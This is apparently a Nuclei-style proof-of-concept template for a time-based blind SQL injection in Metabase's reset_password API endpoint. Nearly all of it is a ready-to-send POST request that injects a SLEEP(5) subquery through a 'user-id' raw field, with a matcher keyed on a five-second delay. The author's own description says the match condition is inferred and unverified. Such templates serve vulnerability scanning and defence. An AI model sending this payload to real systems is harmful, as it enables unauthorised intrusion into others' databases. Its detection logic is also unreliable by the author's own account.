id: poc-lz6fdfz3mhpieo4d
info:
  name: Metabase reset_password存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - "POST /api/session/reset_password HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 214\n\n{\n    \"token\": \"1_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\",\n    \"password\": \"SuperComplex_P@ssw0rd_9!aB\",\n    \"user-id\": {\n        \"raw\": \"(SELECT 1 FROM (SELECT SLEEP(5)) t)\"\n    }\n}"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
